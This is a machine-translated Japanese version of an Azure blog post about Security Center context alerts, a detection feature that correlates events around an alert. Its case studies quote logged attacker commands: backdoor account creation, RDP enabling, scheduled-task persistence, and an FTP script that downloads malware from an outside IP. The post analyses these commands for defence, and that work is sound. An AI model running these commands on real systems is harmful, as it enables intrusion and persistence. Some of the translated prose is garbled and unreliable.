### YamlMime:Yaml
ms.openlocfilehash: a83f7d22f49f96f183caf3e333f488104ecd4803
ms.sourcegitcommit: d03bdc7fe5447adb6530886aab848b75fe8fa8ee
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 03/11/2022
ms.locfileid: "139889587"
Slug: azure-security-center-adds-context-alerts-to-aid-threat-investigation
Title: Azure Security Center調査を支援するためにコンテキスト アラートを追加する
Summary: 最近の 2 つの記事では、Greg 、 、 Jessen、 Jessen、 セキュリティ アラートによってトリガーされる調査プロセスについて説明しました。 まだ行っていない場合は、「How Azure Security Center helps...
Content: >-
  <p>最近の 2 つの記事では、Greg 、 、 Jessen、 Jessen、 セキュリティ アラートによってトリガーされる調査プロセスについて説明しました。 &ldquo;<a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-reveal-a-cyberattack/" target="_blank"></a>&rdquo; &ldquo;まだ行っていない&#39;、サイバー攻撃を明らかにするために Azure Security Center が役立つ方法」と「Azure Security Center が ビットコイン マイニング攻撃を検出する方法」<a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-detects-a-bitcoin-mining-attack/" target="_blank">を参照</a>&rdquo;してください。この投稿は、読んでおいた方&#39;意味があります。 これらの記事では、ログからの背景情報が攻撃をより深く理解するのにどのように役立ったかについて説明します。 理解したら、適切な修復アクションのセットを特定して、セキュリティ侵入をブロックし、同様のインシデントが発生するのを防ぐことができます。</p>


  <p>この種の調査プロセスは、多くの場合、顧客がレプリケートするのが困難です。 何を探すのかを知るには、多くの専門知識が必要です。 ほとんどの企業には&rsquo;、給与に関する Greg や Jessen のようなセキュリティの専門家がいて、すべてのレポートから、雇用に非常にコストがかかります。 また、&rsquo;プロセスには時間がかかり、多くの場合、数時間または数日のヒントが必要です。攻撃者のアクティビティを特定するために、クエリの作成と調整、データの解釈が必要です。</p>


  <p>この問題に対処するために、最近、新しい種類のアラートをデプロイしました。 このアラートは、セキュリティ調査作業の一部の側面を自動化し、攻撃中および攻撃の直前にシステムで発生したその他の状況について、より関連性の高いコンテキストを顧客に提供しようと試みることができます。 コンテキスト収集は、セキュリティ検出アラートが報告されるたびにトリガーされます。 関連するコンテキストが見つかった場合は、フォローアップの疑わしい動作アラートで &ldquo;報告&rdquo; されます。</p>


  <h2>Azure Security Portal からの例</h2>


  <p>これらの&rsquo;アラートの 1 つを確認して、アラートに含まれるもの、およびセキュリティ アラートを取り巻くコンテキストの全体像を取得する方法を確認します。 コンテキスト アラートには、他のアラートの追加 &ldquo;コンテキストとして報告される、スナップタイトル 、潜在的に疑わしい動作があります。&rdquo;</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/44960838-9e58-4e0a-a4c3-fa6c19aefc8f.png"><img alt="ContextCollectorScreenShot" border="0" height="907" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/af72a865-2652-4e8b-bcf6-ce71856387c8.png" style="border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px" title="ContextCollectorScreenShot" width="465"></a></p>


  <p>上記のコンテキスト アラートには、いくつかの説明で注釈が付けされています。 これは、元のアラートの時刻に近い、興味深い可能性のあるイベントの時間順リストにコンパイルされた 3 つの個別のコンテキスト クエリの結果を示しています。</p>


  <p>イベント データは要約形式で表示しますが、CONTEXTEVENTACTIVITY フィールドの内容をコピーしてテキスト エディターに貼り付けると、何が起こっているのかを簡単に確認できます。 &quot;ほとんどのプロセス実行イベントでは、各行に次の項目、プロセスが実行された時刻、プロセス名、プロセス コマンド ライン、繰り返し時間または数、レポート カテゴリ (通常は UnusualProcess&quot; &quot;または RDPLogon&quot;) が表示されます。 繰り返しフィールドは、同じイベントが別の時刻に繰り返された場合に示します。繰り返し回数が 3 回以下の場合は、時間が記録されます。3 つを超える場合は、単純な回数の繰り返しが含まれます。</p>


  <p>少数のアラートだけがコンテキスト レポートになります。 これは、疑わしい動作を&rsquo;明示的に探し、見つからない場合はレポートを&rsquo;作成しないのでです。 探している動作の種類は、通常とは異なるコマンドが実行され、通常とは異なる実行パターンです。 これらは通常、それ自体でアラートをトリガーするのに十分な疑いを持てないが、セキュリティ検出の 1 つからの肯定的なアラートのコンテキストでは、重要な裏付け証拠を提供できます。 発生元のアラートと共に表示すると、攻撃中に何が起こっていたかをより完全に理解できます。</p>


  <h2>それはどのように機能しますか?</h2>


  <p>前に説明したように、Azure Security Center検出に関するアラートを生成すると、コンテキスト サービスがトリガーされ、人間の調査担当者がアラートについて質問するのと同じ質問の一部に回答します。 たとえば、この&quot;ログオン セッションで他の&quot;&quot;異常なプロセスが実行されたのか、Who最近この仮想マシンにログオンした場合などです。&rdquo;アラートの種類とアラートで使用できるデータ項目に応じて、異なるデータ ソースとジョブが選択されます。 たとえば、アラートにユーザー アカウントの詳細が含まれている場合は、それを使用して、アラートの時刻の頃に同じアカウント セッションで実行されたその他の内容を確認できます。 これらのクエリの関連データは、次のクエリで疑わしい動作コンテキスト アラートとしてAzure Security Center。</p>


  <h2>ケース スタディ</h2>


  <p>Greg の以前の投稿で見られた攻撃&#39;例を次に示 <a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-reveal-a-cyberattack/" target="_blank">します</a>。 コンテキスト レポートは、システムのセキュリティ状態&ldquo;を下げる<em>という警告によってトリガーされました。Cacls の疑わしい使用が検出されました。</em>&rdquo;結果のコンテキスト レポートは、3 つの異なるコンテキスト ジョブからの出力を、時間順のイベント セットに結合します。 繰り返し&rsquo;を減らし、読みやすくするために、詳細の一部が取り除かされています。</p>


  <div>

  <pre class="prettyprint">

  Alert Description: &quot;Related alert (dated 2017-04-21 09:37:47Z). 4 items in report (Unusual processes executed, RDP Logons, Supplemental processes executed, Unusual multi-processes commandline execution)&quot;,

  ContextEventActivity:

  00:47:44Z xxxxxxUser  175.143.245.210  (RDPLogon)

  09:37:26Z &quot;C:\windows\system32\ftp.exe&quot; -s:C:\WINDOWS\system32\us.dat

  09:37:32Z ftp -s:xpoffice.exe

  09:37:32Z ftp -s:c:\RECYCLER\xpoffice.exe

  09:37:33Z ftp -s:c:\xpoffice.exe

  09:37:45Z &quot;C:\Windows\System32\net.exe&quot; stop CryptSvc

  09:37:45Z &quot;C:\Windows\System32\regsvr32.exe&quot; urlmon.dll shdocvw.dll jscript.dll vbscript.dll /s

  09:37:45Z &quot;C:\Windows\System32\cacls.exe&quot; C:\Windows\system32\wscript.exe /e /t /g SYSTEM:F

  [removed some items for brevity]...

  09:37:46Z &quot;C:\Windows\System32\cacls.exe&quot; C:\Windows\system32\cscript.exe /e /t /g SYSTEM:F

  09:37:46Z &quot;C:\Windows\System32\cacls.exe&quot; C:\Windows\system32\ias\ias.mdb /e /t /g SYSTEM:F

  09:37:46Z &quot;C:\Windows\System32\net.exe&quot; localgroup administrators abai$/add

  09:37:46Z &quot;C:\Windows\System32\net.exe&quot; user www.401hk.com Www.401hk.com$

  09:37:46Z &quot;C:\Windows\System32\net.exe&quot; user www.401hk.com/active:yes

  09:37:46Z &quot;C:\Windows\System32\reg.exe&quot; ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&quot;

  [Report truncated...maximum number of items exceeded]

  </pre>


  <p>すべてのイベント リストが攻撃に関連している可能性は一方で、上記のイベント トレースでは、次のアクティビティを確認できます。</p>


  <ul>
   <li>この場合、おそらく関連のない RDP ログオン。</li>
   <li>スクリプト化された FTP コマンドの異常な実行。</li>
   <li>暗号化サービスWindowsシャットダウンします。</li>
   <li>スクリプト DLL の登録。 通常、これらはサーバーに登録されませんが、明らかに攻撃によって必要になります。</li>
   <li>cscript および wscript 実行可能ファイルに対するアクセス許可の設定。</li>
   <li>新しいユーザー アカウントの作成。</li>
   <li>ターミナル サービス (RDP) ログオンからの制限の削除。</li>
  </ul>


  <p>残念ながら、この時点で、攻撃の全範囲に従うために領域が使い切りますが、この 30 項目のスニペットから、削除された項目を差し引いてスペースを節約した場合でも、異常で望ましくない状況が発生しているのは明らかです。 さらに最後の手掛かりは、これらのイベントのタイミングです。 同じ 1 分以内に実行される、それ以外の関連のないプロセスのシリーズ全体が、スクリプト化された攻撃の明確な兆候です。</p>


  <p>これは、異常なプロセス実行が検出されたアラートに基づいて、説明が編集された同様の攻撃パターンの<em></em>もう 1 <em>つの興味深い</em>バリエーションです。</p>


  <div>

  <pre class="prettyprint">

  11:44:09Z  &quot;C:\Windows\System32\regini.exe&quot; c:\windows\system32\1025\run.ini

  11:44:09Z &quot;C:\Windows\System32\regini.exe&quot; c:\windows\system32\1025\runq.ini

  11:44:16Z &quot;C:\Windows\System32\SecEdit.exe&quot; /configure /cfg &quot;C:\WINDOWS\system32\NewAuto.inf&quot; /db newdb.sdb /log logfile.txt /areas REGKEYS FILESTORE

  11:44:16Z &quot;C:\Windows\System32\SecEdit.exe&quot; /configure /db secedit.sdb /cfg NewAuto.inf

  11:44:16Z &quot;C:\Windows\System32\SecEdit.exe&quot; /configure /db secedit.sdb /cfg F***Gothin.inf

  11:44:28Z &quot;C:\Windows\System32\cacls.exe&quot; cmd.exe /e /t /g system:f

  11:44:28Z &quot;C:\Windows\System32\cacls.exe&quot; ftp.exe /e /t /g system:f

  11:44:29Z &quot;C:\Windows\System32\cacls.exe&quot; net.exe /e /t /g system:f

  11:44:29Z &quot;C:\Windows\System32\cacls.exe&quot; net1.exe /e /t /g system:f

  11:44:29Z &quot;C:\Windows\System32\cacls.exe&quot; wscript.exe /e /t /g system:f

  11:44:29Z &quot;C:\Windows\System32\cacls.exe&quot; cscript.exe /e /t /g system:f

  11:44:49Z &quot;C:\Windows\System32\net.exe&quot; stop CryptSvc

  11:44:50Z &quot;C:\Windows\System32\regsvr32.exe&quot; urlmon.dll shdocvw.dll jscript.dll vbscript.dll /s  [Repeats: 11:44:50.82]

  11:45:01Z &quot;C:\Windows\System32\ftp.exe&quot; -s:C:\MG05.dll

  11:45:02Z &quot;C:\Windows\System32\schtasks.exe&quot; /create /tn &quot;45645&quot; /tr &quot;c:\Ttqlhcjntzllto.exe&quot; /sc minute /mo 1 /ru &quot;system

  11:45:03Z &quot;C:\Windows\system32\cmd.exe&quot; /c net1 stop sharedaccess&amp;echo open 222.184.79.11 &gt; MG06.dll&amp;echo mix&gt;&gt; MG06.dll&amp;echo mix&gt;&gt; MG06.dll&amp;echo binary &gt;&gt; MG06.dll&amp;echo get Ttqlhcjntzllto.exe &gt;&gt; MG06.dll&amp;echo bye &gt;&gt; MG06.dll&amp;ftp -s:MG06.dll&amp;p -s:MG06.dll&amp;Ttqlhc....

  11:45:03Z ftp  -s:MG06.dll

  </pre>


  <p>これは、 <strong>regini.exe を </strong>使用して一括レジストリ編集を実行し、 <strong>secedit.exe </strong>を使用してシステムセキュリティを変更し、スケジュールされたタスクを作成する方法を示しています。これは、マシンの永続的な足がかりをセキュリティで保護する可能性が最も高いタスクです。 最後の 2 行は、<strong>cmd.exe リダイレクトを</strong>使用して ftp スクリプトを作成し、スクリプトを実行してマルウェアの一部を <strong> ダウンロードTtqlhcjntzllto.exe。 </strong> 前の行 (最後から 3 行目) では、この実行可能ファイルはスケジュールされたタスクとしてインストールされます。 これは順不同のように見えますが、これは、多くの場合、攻撃スクリプトが繰り返し実行され、正常に完了する可能性が高くなるためです。そのため、&#39;では、このスクリプトの 2 回の実行の開始と終了を含むスナップショットが表示される可能性があります。</p>


  <h2>次の&rsquo;情報</h2>


  <p>これらのレポートは既にアラートの重要なコンテキストを提供しますが、これを改善し続け、含まれるデータの種類を拡張し、出力をよりスマートにする方法に取り組む必要があります。</p>


  <h2>参照する内容</h2>


  <ul>
   <li>Azure Security Center &mdash; がサイバー攻撃の検出に役立つ方法の実際の例を含む他のブログ投稿を参照してください <a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-reveal-a-cyberattack/" target="_blank">Azure Security Center</a> がサイバー攻撃を明らかにする方法と<a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-detects-a-bitcoin-mining-attack/" target="_blank"></a>、Azure Security Center が ビットコイン マイニング攻撃を検出する方法。</li>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-detection-capabilities" target="_blank">Azure Security Center検出機能</a> &mdash; 高度なAzure Security Center&rsquo;機能について説明します。</li>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-managing-and-responding-alerts" target="_blank">セキュリティ アラートの管理</a>&mdash;とAzure Security Centerセキュリティ アラートを管理して対応する方法について学習します。</li>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-faq" target="_blank">Azure Security Center FAQ</a> &mdash; サービスの使用に関してよく寄せられる質問を見つける。</li>
  </ul>

  </div>

  </div>
